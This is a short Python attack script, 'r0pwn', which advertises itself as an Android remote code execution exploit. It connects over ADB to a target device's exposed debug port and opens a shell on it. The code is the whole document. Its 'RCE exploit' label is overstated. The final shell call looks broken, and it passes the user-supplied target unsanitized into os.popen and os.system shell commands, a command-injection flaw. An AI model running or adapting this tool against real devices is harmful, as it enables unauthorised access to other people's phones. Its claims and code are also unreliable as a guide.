import sys
import time
import os

def connect(device):
    print("exploiting "+device+"...")
    os.popen("adb connect "+device).read()
    time.sleep(1)
    
def header():
    print("""
======================
r0pwn by Ivan Nikolsky
======================

Latest Android OS RCE exploit.
""")

def main():
    if len(sys.argv) < 2:
        print("usage: exploit.py <target>")
        print("reason [no args given]")
        sys.exit()
    else:
        if len(sys.argv) > 2:
            print("usage: exploit.py <target>")
            print("reason [a lot of args given]")
            sys.exit()
        else:
            target = sys.argv[1].split(":")[0]
            connect(target)
            is_connected = os.popen("adb devices | grep "+target).read()
            is_offline = os.popen("adb devices | grep offline").read()
            if is_connected == "":
                print("failed to connect")
                print("reason [connection refused]")
                sys.exit()
            else:
                if is_offline == "":
                    pass
                else:
                    print("failed to connect")
                    print("reason [device offline]")
                    sys.exit()
            os.system("adb shell "+target)

main()
